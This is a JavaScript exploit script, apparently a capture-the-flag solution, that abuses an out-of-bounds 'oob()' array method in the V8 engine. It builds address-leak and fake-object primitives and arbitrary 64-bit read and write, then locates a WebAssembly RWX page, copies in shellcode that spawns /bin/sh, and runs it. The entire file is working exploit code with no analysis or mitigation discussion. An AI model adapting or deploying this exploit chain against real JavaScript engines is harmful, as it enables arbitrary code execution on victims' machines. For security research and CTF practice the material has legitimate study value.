var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

//float -> uint64
function f2u(f)
{
	float64[0] = f;
	return bigUint64[0];
}

//uint64 -> float
function u2f(u)
{
	bigUint64[0] = u;
	return float64[0];
}

function hex(u)
{
	return u.toString(16).padStart(16, "0");
}

var obj = {"a": 1}
var obj_array = [obj]
var float_array = [1.1]

var obj_array_map = obj_array.oob()
var float_array_map = float_array.oob()

//leaking object's address
function addressOf(obj_to_leak)
{
	obj_array[0] = obj_to_leak;
	obj_array.oob(float_array_map);
	let obj_addr = f2u(obj_array[0]) - 1n;
	//restore the obj map
	obj_array.oob(obj_array_map);
	return obj_addr;
}

//turn addr to object
function fakeObject(addr_to_fake)
{
	float_array[0] = u2f(addr_to_fake + 1n);
	float_array.oob(obj_array_map);
	let faked_obj = float_array[0];
	//restore the float map
	float_array.oob(float_array_map);
	return faked_obj;
}

var fake_array = [
	float_array_map,
	u2f(0n),
	u2f(0x41414141n),
	u2f(0x1000000000n),
	1.1,
	2.2,
	];

//%DebugPrint(fake_array)
var fake_array_addr = addressOf(fake_array);

//console.log("fake_array: " + hex(fake_array_addr));
//%SystemBreak();
var fake_object_addr = fake_array_addr - 0x40n + 0x10n;
var fake_object = fakeObject(fake_object_addr);

function read64(addr)
{
	fake_array[2] = u2f(addr - 0x10n + 0x1n);
	let leak_data = f2u(fake_object[0]);
	console.log("[*] leak from: 0x" + hex(addr) + ": 0x" + hex(leak_data));
	return leak_data;
}

function write64(addr, data)
{
	fake_array[2] = u2f(addr - 0x10n + 1n);
	fake_object[0] = u2f(data);
	console.log("[*] write to: 0x" + hex(addr) + ": 0x" + hex(data));
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

var f_addr = addressOf(f);
console.log("[*] leak wasm func addr: 0x" + hex(f_addr));
var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
var rwx_page_addr = read64(wasm_instance_addr + 0x88n);

console.log("[*] leak rwx_page_addr: 0x" + hex(rwx_page_addr));

var shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
];

var data_buf = new ArrayBuffer(24);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = addressOf(data_buf) + 0x20n;

write64(buf_backing_store_addr, rwx_page_addr);
data_view.setFloat64(0, u2f(shellcode[0]), true);
data_view.setFloat64(8, u2f(shellcode[1]), true);
data_view.setFloat64(16, u2f(shellcode[2]), true);
//%SystemBreak();
f();